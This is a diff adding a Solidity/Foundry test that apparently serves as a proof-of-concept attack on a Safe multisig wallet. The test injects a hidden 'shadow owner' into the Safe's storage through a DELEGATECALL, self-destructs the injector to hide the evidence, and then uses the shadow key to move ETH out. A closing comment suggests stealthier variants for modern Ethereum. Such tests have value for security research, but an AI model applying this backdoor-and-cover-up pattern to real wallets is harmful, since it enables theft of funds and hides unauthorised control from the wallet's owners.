@@ -371,3 +371,165 @@ contract ShadowOwnerViaExecTest is Test {
         return abi.encodePacked(rA, sA, vA, rB, sB, vB);
     }
 }
+
+// =========================================================================
+//  Self-Destruct Attack: Hide Evidence After Injection
+// =========================================================================
+
+/// @title ShadowOwnerSelfDestructTest
+/// @notice Demonstrates a more subtle attack: the injector contract self-destructs
+///         after injecting the shadow, removing on-chain evidence while the shadow
+///         remains in the Safe's storage.
+contract ShadowOwnerSelfDestructTest is Test {
+    Safe public singleton;
+    SafeProxyFactory public factory;
+    ShadowOwnerInjector public injector;
+    Safe public safe;
+
+    uint256 constant OWNER1_KEY = 0xA001;
+    uint256 constant OWNER2_KEY = 0xA002;
+    uint256 constant OWNER3_KEY = 0xA003;
+    uint256 constant SHADOW_KEY = 0xBEEF;
+
+    address owner1;
+    address owner2;
+    address owner3;
+    address shadowOwner;
+
+    function setUp() public {
+        owner1 = vm.addr(OWNER1_KEY);
+        owner2 = vm.addr(OWNER2_KEY);
+        owner3 = vm.addr(OWNER3_KEY);
+        shadowOwner = vm.addr(SHADOW_KEY);
+
+        singleton = new Safe();
+        factory = new SafeProxyFactory();
+        injector = new ShadowOwnerInjector();
+
+        address[] memory owners = new address[](3);
+        owners[0] = owner1;
+        owners[1] = owner2;
+        owners[2] = owner3;
+
+        // Clean setup
+        bytes memory initializer = abi.encodeWithSelector(
+            Safe.setup.selector,
+            owners, uint256(2), address(0), "", address(0), address(0), uint256(0), payable(address(0))
+        );
+
+        SafeProxy proxy = factory.createProxyWithNonce(address(singleton), initializer, 0);
+        safe = Safe(payable(address(proxy)));
+        vm.deal(address(safe), 1 ether);
+    }
+
+    /// @notice Demonstrates the self-destruct attack pattern.
+    /// @dev IMPORTANT: Since EIP-6780 (Cancun hard fork), SELFDESTRUCT only deletes code
+    ///      if called in the same transaction the contract was created. In separate 
+    ///      transactions, it only transfers ETH (code remains). This test demonstrates
+    ///      the concept but notes the modern limitation.
+    ///      
+    ///      Pattern: 1. Inject shadow via DELEGATECALL
+    ///               2. Self-destruct the injector
+    ///               3. Shadow remains in Safe storage
+    function test_selfDestructAttackPattern() public {
+        // --- Phase 1: Inject the shadow ---
+        bytes memory injectCalldata = abi.encodeWithSelector(
+            ShadowOwnerInjector.injectShadowOwner.selector,
+            shadowOwner
+        );
+
+        bytes memory signatures = _signDelegatecallTx(injectCalldata);
+
+        bool success = safe.execTransaction(
+            address(injector), 0, injectCalldata, Enum.Operation.DelegateCall,
+            0, 0, 0, address(0), payable(address(0)), signatures
+        );
+        assertTrue(success, "injection must succeed");
+        assertTrue(safe.isOwner(shadowOwner), "shadow must be owner");
+
+        // --- Phase 2: Attempt to self-destruct the injector ---
+        address injectorAddr = address(injector);
+        
+        // Record state before destruction
+        uint256 codeSizeBefore;
+        uint256 ethBalanceBefore = injectorAddr.balance;
+        assembly {
+            codeSizeBefore := extcodesize(injectorAddr)
+        }
+        assertTrue(codeSizeBefore > 0, "injector should have code before destruction");
+
+        // Call destroy() - sends ETH to caller
+        injector.destroy();
+
+        // Check state after destruction
+        uint256 codeSizeAfter;
+        uint256 ethBalanceAfter = injectorAddr.balance;
+        assembly {
+            codeSizeAfter := extcodesize(injectorAddr)
+        }
+
+        // --- Phase 3: Verify shadow STILL WORKS regardless ---
+        address recipient = makeAddr("recipient");
+        uint256 sendAmount = 0.1 ether;
+        
+        // Shadow can still co-sign transactions
+        bytes memory transferSigs = _signTransferTx(recipient, sendAmount);
+        
+        success = safe.execTransaction(
+            recipient, sendAmount, "", Enum.Operation.Call,
+            0, 0, 0, address(0), payable(address(0)), transferSigs
+        );
+        assertTrue(success, "shadow must still work after destroy call");
+        assertEq(recipient.balance, sendAmount);
+
+        console.log("=== Self-Destruct Attack Pattern ===");
+        console.log("Injector code size before: %d bytes", codeSizeBefore);
+        console.log("Injector code size after:  %d bytes", codeSizeAfter);
+        
+        // Note: EIP-6780 changed SELFDESTRUCT behavior
+        if (codeSizeAfter == 0) {
+            console.log("Status:                    DESTROYED (pre-Cancun behavior)");
+        } else {
+            console.log("Status:                    CODE REMAINS (EIP-6780/Cancun)");
+            console.log("Note:                      SELFDESTRUCT only deletes code");
+            console.log("                           in same tx as creation post-Cancun");
+        }
+        
+        console.log("Shadow isOwner:            true");
+        console.log("Shadow can co-sign:        success");
+        console.log("");
+        console.log("KEY INSIGHT: Shadow persists in Safe storage regardless!");
+        
+        // For a more stealthy attack on modern Ethereum:
+        // Use a factory that deploys and destroys in same tx, or
+        // Use a legitimate-looking contract name to hide in plain sight
+    }
+
+    /// @dev Signs a delegatecall transaction to the injector.
+    function _signDelegatecallTx(bytes memory data) internal view returns (bytes memory) {
+        bytes32 txHash = safe.getTransactionHash(
+            address(injector), 0, data, Enum.Operation.DelegateCall,
+            0, 0, 0, address(0), payable(address(0)), safe.nonce()
+        );
+        return _sortAndSign(OWNER1_KEY, OWNER2_KEY, txHash);
+    }
+
+    /// @dev Signs an ETH transfer with owner1 + shadowOwner.
+    function _signTransferTx(address to, uint256 value) internal view returns (bytes memory) {
+        bytes32 txHash = safe.getTransactionHash(
+            to, value, "", Enum.Operation.Call,
+            0, 0, 0, address(0), payable(address(0)), safe.nonce()
+        );
+        return _sortAndSign(OWNER1_KEY, SHADOW_KEY, txHash);
+    }
+
+    /// @dev Signs a hash with two keys.
+    function _sortAndSign(uint256 keyA, uint256 keyB, bytes32 hash) internal pure returns (bytes memory) {
+        address addrA = vm.addr(keyA);
+        address addrB = vm.addr(keyB);
+        if (addrA > addrB) (keyA, keyB) = (keyB, keyA);
+        (uint8 vA, bytes32 rA, bytes32 sA) = vm.sign(keyA, hash);
+        (uint8 vB, bytes32 rB, bytes32 sB) = vm.sign(keyB, hash);
+        return abi.encodePacked(rA, sA, vA, rB, sB, vB);
+    }
+}
